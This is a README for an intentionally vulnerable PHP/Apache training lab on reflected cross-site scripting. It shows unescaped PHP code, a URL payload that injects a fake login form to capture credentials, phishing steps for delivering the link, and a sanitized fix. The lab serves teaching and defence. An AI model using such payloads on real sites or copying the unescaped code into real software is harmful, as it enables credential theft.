# PHP / Apache web stack vulnerable to Reflective XSS
NOTE: There is no DB attached to the web app which means you can put any username and password will.....bad security practice...I know ;)

# Purpose
- To understand the development side when identifying vulnerabilities in web applications
- Integrate on application security practices and web application developement

# Prerequisites
- Docker => ```docker --version``` to verify installation
- git => ```git --version``` to verify installation
- Visual Studio Code => code editor 
  NOTE: I used vi/vim for most of my coding for this repo

# Steps on how to run the container
- Download the repo => ```git clone https://github.com/p-cap/Php-Apache-Reflective-XSS.git```
- change the permissions on build-docker.sh => ```chmod 700 build-docker.sh```
- run the ```build-docker.sh```

# Synopsis
This repository contains not only php vulnerable code but also another version which sanitization is applied to mitigate such attack

# Usage
1. connect to ```http://localhost:8080/```
2. You'll start with the unsanitized version of the site
3. Put any username and password then click login
4. You'll be redirected to another page with a "WELCOME, $username"
5. The link *"Ready to be phished??"* will take you to another page which contains more links. The first link uses the script tag-alert combo to test if the site is vulnerable. The links contain html tags encoded differently to simulate a Reflective XSS attack
6. The *URL with url encoded HTML tags*, *URL encoded Link* and *Unicode* will redirect to another login page. The page is embedded in the links
7. When you enter you a username and password, those credentials are stored in a text file named *saved.txt*. The file simulates an attacker stealing usernames and passwords
8. Going to the home page, you can click on the last link that switches the site between the sanitized and unsanitized version of the site
9. You follow the same procedures but the difference is when you are redirected to the other login page, the page will show you that *you are not entering a username* 

# Victimology
1. User receives one of the links from ```phish.html```
2. User clicks the link 
3. User is presented a login page 
   NOTE: The login page is NOT the attacker webpage. The webpage was rendered through the malicious links within phish.html
4. User enters username and password 
5. Attacker now has the victim's credentials

# Attack-ology
1. Attacker identifies a site that is vulnerable to Reflective XSS
2. One way to identify that a site is vulnerable to Reflective XSS is through the *script tag - alert combo* (first link)
3. Once the attacker sees a vulnerable site, the attack creates a link to render a login page utilizing the vulnerable site:
Partially Encode URL link
```
 <a href="http://localhost:8080/welcome.php?username=
    <div id=%22stealPassword%22>
      Please Login:<form name=%22input%22 action=%22http://localhost:8080/credentials.php%22 method=%22post%22>
      Username: <input type=%22text%22 name=%22username%22 />
      <br/>
      Password: <input type=%22password%22 name=%22password%22 />
      <br/>
      <input name=%22submit%22 type=%22submit%22 value=%22Login%22 /></form>
    </div>">
```
4. Rename link to make it less suspicious. I tested the link on a compose e-mail window
5. Send it to the victim

# Mitigation through code
Change ```welcome.php``` code 

### Original Welcome.php code
```
<?php
$username = $_GET['username'];
echo '<h1> Welcome, ' . $username . '</h1>';
?>
<input type="button" value="Back" onClick="history.go(-1)"/>

```

### Sanitized Welcome.php (for this repo, I created a seperate php code called "sanitized.php")
```
<?php
$username = filter_var($_GET['username'], FILTER_SANITIZE_STRING);

if(preg_match("/^[a-zA-Z0-9_.-]*$/", $username)) {
        echo ' <h1> Welcome, ' . $username . '</h1>';
}
else {
        echo '<h1> You are not a username</h1>';
}
?>
<br />
<input type="button" value="Back" onClick="history.go(-1)"/>
```
NOTE: Sanitizing the $_GET superglobal variable is just one way in mitigating Reflective XSS based on the attacker's approach utilized in this repo



